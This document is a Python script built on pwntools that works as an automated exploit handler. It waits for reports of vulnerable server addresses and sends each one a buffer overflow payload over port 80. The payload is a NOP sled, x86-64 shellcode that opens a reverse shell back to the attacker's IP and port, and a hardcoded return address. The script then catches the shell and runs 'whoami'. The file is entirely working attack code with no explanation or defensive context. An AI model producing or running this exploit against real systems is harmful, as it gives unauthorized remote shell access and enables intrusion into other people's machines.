#!/bin/python3

import json
import sys
import socket
import struct
from pwn import *


exploit_ports = []
smallest_exploit_port = 6000
biggest_exploit_port = 65534


class ExploitHandler:
    """The exploit handler"""

    def __init__(self):
        config = self.read_config()
        self.local_ip = config['local_ip']
        self.listen_port = config['listen_port']
        self.public_ip = config['public_ip']

    def read_config(self):
        f = open('config.json', 'r')
        config = json.load(f)
        f.close()
        return config
    
    def listen_loop(self):
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind((self.local_ip, self.listen_port))
        server_socket.listen(5)

        while True:
            client_socket, address = server_socket.accept()
            vuln_server_address = client_socket.recv(1024).decode()
            print(vuln_server_address)
            self.exploit(vuln_server_address)
            print("Done")
            client_socket.close()

    def exploit(self, vuln_server_address):
        backdoor_sever_socket = self.get_backdoor_sever_socket()
        backdoor_host, backdoor_port = self.host_and_port_to_bytes(self.public_ip, backdoor_sever_socket.getsockname()[1])
        payload = self.craft_payload(backdoor_host, backdoor_port)

        backdoor_sever_socket.listen(5)
        payload_delivery_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # The vuln relies on the server running on port 80
        payload_delivery_socket.connect((vuln_server_address, 80))
        payload_delivery_socket.sendall(payload)
        payload_delivery_socket.close()

        backdoor_socket, address = backdoor_sever_socket.accept()
        backdoor_socket.sendall(b'whoami\x0a')
        print(backdoor_socket.recv(1024).decode())
        #conn = listen(backdoor_server_socket.getsockname()[1])
        backdoor_socket.close()
        backdoor_sever_socket.close()

    def get_backdoor_sever_socket(self):
        backdoor_sever_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        backdoor_sever_socket.bind((self.local_ip, 0))
        return backdoor_sever_socket

    def host_and_port_to_bytes(self, host, port):
        host = socket.inet_aton(host)
        port = struct.pack('>H', port)
        return (host, port)

    def craft_payload(self, host, port):
        shellcode = b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02" + port + b"\xc7\x44\x24\x04" + host + b"\x48\x89\xe6\x6a\x10\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05"

        # change p64 to struct function
        shellcode_location = p64(0x7fffffffdb10)

        payload = b"\x90"*4850 + shellcode + b"\x41"*80 + shellcode_location

        return payload


if __name__ == "__main__":
    exploit_handler = ExploitHandler()
    exploit_handler.listen_loop()

